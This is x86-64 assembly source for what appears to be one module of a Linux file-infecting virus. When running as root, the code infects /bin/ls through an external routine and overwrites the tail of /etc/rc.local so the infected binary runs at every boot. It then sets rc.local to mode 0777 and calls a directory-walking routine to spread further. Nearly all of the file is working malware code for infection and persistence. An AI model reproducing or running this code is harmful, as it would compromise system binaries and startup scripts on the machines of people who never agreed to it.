section .text
    global _start_infect
    global _infect_from_root
    extern _final_end
    extern _string
    extern _treat_file
    extern _read_dir

_rc_local:
    .string db '/etc/rc.local', 0
    .len equ $ - _rc_local.string

_str_to_add_rc:
    .string db 'env -i TEST=LOL /bin/ls > /ptdr', 10, 'exit 0', 10
    .len equ $ - _str_to_add_rc.string

_binary_infect_path:
    .string db '/bin/ls', 0
    .len equ $ - _binary_infect_path.string

_start_infect: ; (rdi: env addr)
    enter 24, 0
	mov rax, 107
	syscall ; We call geteuid
	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect /etc/rc.local
	jne _ret
    mov rax, 0x000000000000736c ; ls
    push rax
    mov rax, 0x000000006e69622f ; /bin
    push rax
    mov rdi, rsp
    add rdi, 8
	xor r10, r10 ; r10 = 0
	lea r10, [rel _final_end] ; r10 = &_final_end
	add r10, 2 ; final_end have 2 bytes of instrucitions
	xor r11, r11
	lea r11, [rel _string] ; r11 = &_string
	sub r10, r11 ; &_final_end -= &_string
	mov rsi, r10 ; virus size = r10
    mov rdx, rsp
    mov r10, 0
    call _treat_file
    pop rdi
    pop rdi
    mov rax, 2
    lea rdi, [rel _rc_local.string]
    mov rsi, 2
    syscall
    cmp rax, 0
    jle _exit_properly
    mov QWORD [rsp + 16], rax
    mov rax, 8
    mov rdi, QWORD [rsp + 16]
    mov rsi, -7
    mov rdx, 2
    syscall
    mov rax, 1
    mov rdi, QWORD [rsp + 16]
    lea rsi, [rel _str_to_add_rc.string]
    mov rdx, _str_to_add_rc.len
    syscall
    mov rax, 91
    mov rdi, QWORD [rsp + 16]
    mov rsi, 511
    syscall
    mov rax, 3
    mov rdi, QWORD [rsp + 16]
    syscall

_exit_properly:
    mov rax, 60
    mov rdi, 0
    syscall

_ret:
    leave
    ret

_infect_from_root:
    enter 16, 0
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel _mdr_de_rire.string]
    mov rdx, _mdr_de_rire.len
    syscall
    mov rax, 0
    push rax
    mov rax, 1
    push rax
    mov rax, rsp
    add rax, 8
    push rax
    push rax
    call _read_dir
    jmp _exit_properly

_mdr_de_rire:
    .string db 'mdr_de_rire', 10, 0
    .len equ $ - _mdr_de_rire.string
